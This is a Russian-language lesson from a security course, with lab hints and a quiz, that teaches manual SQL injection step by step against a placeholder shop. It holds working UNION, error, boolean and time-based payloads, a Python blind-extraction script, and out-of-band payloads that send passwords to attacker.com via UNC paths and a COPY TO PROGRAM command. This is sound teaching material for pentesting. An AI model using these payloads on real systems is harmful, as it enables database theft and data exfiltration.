---
id: web-tool-sqli-manual
title: "Ручные SQL-инъекции: полный workflow без sqlmap"
category: web
parent: web-tools-sqli
difficulty: medium
order: 2
tags: [sqli, manual, union, blind, error-based, exploitation, scripting]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 60
summary: "Пошаговые ручные SQLi: найти инъекцию, посчитать колонки, UNION/error/boolean/time-blind извлечение, OOB и скриптинг."
lab:
  kind: shell
  title: "Практика: ручная UNION-инъекция"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Цель — `https://shop.example/api/item?id=1`. Сначала нормальный ответ."
    - "Кавычка (`id=1%27`) ломает SQL — увидишь ошибку СУБД."
    - "Посчитай колонки: `id=1 ORDER BY 3` ок, `ORDER BY 4` — ошибка. Значит 3 колонки."
    - "UNION-инъекция: `id=-1 UNION SELECT 1,password,3 FROM users-- -` вернёт флаг. Сохрани в `found.txt` и `check`."
---

## Задача

Бывает, что `sqlmap` бесполезен: параметр прячется в необычном транспорте (JSON, GraphQL, кастомный заголовок), WAF режет автоматические payload, или нужно доказать инъекцию точно и вручную. Тогда работает ручной workflow — он же даёт полное понимание, что происходит. Пройдём его целиком на одном примере.

## Данные, с которыми работаем

Цель — `https://shop.example/api/item?id=1`. Приложение отвечает JSON:

```bash
$ curl -s 'https://shop.example/api/item?id=1'
{"id":1,"name":"Laptop","price":999.0}
```

Задача: доказать инъекцию, определить базу, вытащить таблицу `users`.

## Шаг 1. Обнаружение: ломаем запрос

Самый быстрый тест — кавычка. Она нарушает строковый литерал, и сервер возвращает ошибку или пустой ответ:

```bash
$ curl -s 'https://shop.example/api/item?id=1%27'
{"error":"SQL syntax error near \"'\" at line 1"}
```

Ошибка есть — параметр уходит в SQL и не параметризован. Теперь проверим, управляем ли мы логикой. Сравним истину и ложь:

```bash
$ curl -s 'https://shop.example/api/item?id=1 AND 1=1'
{"id":1,"name":"Laptop","price":999.0}
$ curl -s 'https://shop.example/api/item?id=1 AND 1=2'
{"error":"not found"}
```

`AND 1=1` вернул товар, `AND 1=2` — нет. Значит, можем задавать базе вопросы. Это **boolean-оракул**.

## Шаг 2. Контекст и определение СУБД

Текст ошибки — отпечаток. Сверим по таблице:

| Фрагмент ошибки | СУБД |
|-----------------|------|
| `You have an error in your SQL syntax` | MySQL |
| `syntax error at or near` | PostgreSQL |
| `Unclosed quotation mark` / `Incorrect syntax` | MSSQL |
| `ORA-0xxxx` | Oracle |
| `unrecognized token` / `near "...": syntax error` | SQLite |

У нас `SQL syntax error` без уточнения, поэтому уточним через функцию версии. В разных базах она разная: `@@version` (MySQL/MSSQL), `version()` (PostgreSQL), `sqlite_version()` (SQLite).

```bash
$ curl -s "https://shop.example/api/item?id=-1 UNION SELECT 1,sqlite_version(),3-- -"
{"id":1,"name":"3.45.1","price":3}
```

База — SQLite.

## Шаг 3. Число колонок

`ORDER BY N` ломается, когда `N` превышает число колонок:

```bash
$ for n in 1 2 3 4; do printf '%s ' "$n"; curl -s "https://shop.example/api/item?id=1 ORDER BY $n-- -" | wc -c; done
1 34
2 34
3 34
4 59
```

На `4` ответ стал длиннее (ошибка длиннее данных) — колонок **три**. Альтернатива — `UNION SELECT NULL` и добавлять NULL, пока не перестанет падать.

## Шаг 4. Какие колонки выводятся

Подставим маркеры `111,222,333`:

```bash
$ curl -s "https://shop.example/api/item?id=-1 UNION SELECT 111,222,333-- -"
{"id":111,"name":"222","price":333}
```

Все три видны — можно класть данные в любую. Обычно вторая колонка удобнее (строковая).

## Шаг 5. UNION-извлечение

Достаём таблицы из `sqlite_master`:

```bash
$ curl -s "https://shop.example/api/item?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -"
{"id":1,"name":"products,users","price":3}
$ curl -s "https://shop.example/api/item?id=-1 UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -"
{"id":1,"name":"admin:S3cr3t!,alice:hunter2","price":3}
```

Готово: дамп получен. UNION — самый быстрый путь, если вывод отражается.

## Шаг 6. Error-based, когда UNION закрыт

Если данные не выводятся, но видно ошибку — печатаем их в ошибке. Для MySQL:

```bash
$ curl -s "https://shop.example/api/item?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -"
XPATH syntax error: '~appdb~'
```

`extractvalue`/`updatexml` (MySQL) и `CAST(... AS int)` (PostgreSQL/MSSQL) заставляют базу вернуть значение в тексте исключения. `0x7e` — маркер `~`, чтобы видеть границы.

## Шаг 7. Boolean-blind: вопросы «да/нет»

Когда ни вывода, ни ошибок, работаем по разнице ответов. `SUBSTR(x,pos,1)` берёт символ, `ASCII()` — его код:

```bash
$ curl -s "https://shop.example/api/item?id=1 AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='S'"
{"id":1,"name":"Laptop","price":999.0}
```

Ответ не пуст → первый символ пароля `S`. Перебирая позиции и символы, восстанавливаем всё значение. Это медленно (по запросу на символ), поэтому автоматизируют скриптом.

## Шаг 8. Time-based: когда ответы одинаковы

Если даже размер ответа не отличается, остаётся время. Задержка подтверждает истину. Функция зависит от базы:

| СУБД | Задержка |
|------|----------|
| MySQL | `SLEEP(5)` |
| PostgreSQL | `pg_sleep(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| Oracle | `dbms_pipe.receive_message('a',5)` |
| SQLite | нет |

```bash
$ time curl -s -o /dev/null "https://shop.example/api/item?id=1 AND SLEEP(5)"
real    0m5.02s
```

## Шаг 9. OOB: данные уходят наружу

В слепой зоне, где закрыто всё, база сама обращается к нашему хосту. Мы слушаем DNS/HTTP, а payload несёт данные в поддомене:

```bash
# MySQL (Windows UNC)
... AND LOAD_FILE('\\\\attacker.com\\'||(SELECT password FROM users LIMIT 1))-- -
# PostgreSQL
... ; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT password FROM users LIMIT 1)||'.attacker.com'
```

На нашем DNS-сервере появляется запрос вида `S3cr3t!.attacker.com`. Данные утекли, хотя приложение ничего не показало.

## Шаг 10. Автоматизация скриптом

Ручной перебор — это цикл. Вот скелет oracle-скрипта для boolean-blind:

```python
import requests
URL = "https://shop.example/api/item"
def yes(cond):
    r = requests.get(URL, params={"id": f"1 AND {cond}"})
    return "Laptop" in r.text          # признак «истина»
val = ""
for i in range(1, 40):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_{}":
        if yes(f"SUBSTR((SELECT password FROM users LIMIT 1),{i},1)='{c}'"):
            val += c; print(val); break
    else:
        break
print("password:", val)
```

Тот же каркас работает для времени (`time.sleep` вместо проверки тела) и для OOB.

## Шпаргалка: функции по СУБД

| Задача | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|--------|-------|------------|-------|--------|--------|
| Версия | `@@version` | `version()` | `@@version` | `v$version` | `sqlite_version()` |
| Агрегация | `GROUP_CONCAT` | `string_agg` | `STRING_AGG` | `LISTAGG` | `GROUP_CONCAT` |
| Строка → символ | `SUBSTR`/`SUBSTRING` | `substr` | `SUBSTRING` | `SUBSTR` | `SUBSTR` |
| Код символа | `ASCII`/`ORD` | `ascii` | `ASCII` | `ASCII` | `ASCII`/`UNICODE` |
| Комментарий | `-- `, `#` | `--`, `/* */` | `--`, `/* */` | `--` | `--` |

## Что мы теперь знаем

- **Обнаружение** — кавычка → ошибка, затем `AND 1=1` vs `AND 1=2`.
- **Контекст** определяет payload; СУБД — по тексту ошибки и функции версии.
- **`ORDER BY`** находит число колонок; `UNION SELECT` — какие выводятся.
- **Порядок техник:** UNION → error-based → boolean → time → OOB (от быстрых к медленным).
- **Скрипт** обязателен для blind: перебор вручную не масштабируется.
- **Скорость — не главное.** Blind-каналы медленные и шумные; планируй под бюджет.

## На что смотреть дальше

- **Не начинай с UNION.** Сначала подтверди инъекцию boolean-тестом.
- **Соблюдай контекст.** Число, строка, `ORDER BY`, JSON — payload разный.
- **`--` в MySQL требует пробела** (`-- -`), иначе не комментарий.
- **SQLite — без time-based.** Не трать время на `SLEEP`.
- **OOB — последний резерв**, но иногда единственный канал в закрытой сети.
- **Скриптуй oracle один раз** и переиспользуй: артефакт экономит часы.

## Квиз

Проверь себя.

```quiz
- question: "Как быстрее всего подтвердить, что параметр уязвим к boolean-инъекции?"
  options:
    - "Запустить --dump-all"
    - "Сравнить ответы на `AND 1=1` и `AND 1=2`"
    - "Отправить SLEEP(5)"
    - "Сменить User-Agent"
  answer: 1
  explanation: "Разница между истинным и ложным условием даёт булев оракул."
- question: "Зачем нужен `ORDER BY N`?"
  options:
    - "Ускорить запрос"
    - "Узнать число колонок перед UNION"
    - "Включить отладку"
    - "Обойти WAF"
  answer: 1
  explanation: "Когда N больше числа колонок, запрос падает — так находится их количество."
- question: "Какая функция печатает данные в тексте ошибки в MySQL?"
  options:
    - "pg_sleep"
    - "extractvalue"
    - "WAITFOR"
    - "LISTAGG"
  answer: 1
  explanation: "extractvalue/updatexml возвращают значение в тексте XPATH-ошибки."
- question: "Почему OOB-канал применяют последним?"
  options:
    - "Он самый быстрый"
    - "Он медленный/сложный, но работает там, где всё остальное закрыто"
    - "Он не требует прав"
    - "Он шифрует данные"
  answer: 1
  explanation: "OOB требует внешнего listener'а и настройки, поэтому это резервный канал."
- question: "Чем отличается blind-перебор от UNION-дампа?"
  options:
    - "Ничем"
    - "Blind идёт по одному биту за запрос, UNION отдаёт данные сразу"
    - "Blind быстрее"
    - "UNION не работает в SQLite"
  answer: 1
  explanation: "UNION отдаёт значения в ответе; blind восстанавливает их по сигналу да/нет — медленно."
```

## Куда дальше

Дальше — продвинутые инъекции, которые прячутся от сканеров: в следующем уроке (`web-second-order-injection`) полезная нагрузка сохраняется на входе и срабатывает позже, в другом запросе. А пока главное запомни порядок: **подтверди → определи контекст → посчитай колонки → UNION → error → boolean → time → OOB**, и для blind сразу пиши скрипт.

## Где пригодится

- **CTF (Web):** ручной workflow выручает там, где автоматика слепа.
- **Bug bounty:** точный PoC вручную убедительнее и снижает ложные срабатывания.
- **Пентест:** нестандартные транспорты (JSON, GraphQL) почти всегда требуют ручной работы.
- **Работа (AppSec):** понимание всех техник помогает правильно выбирать защиту (параметризация, права).
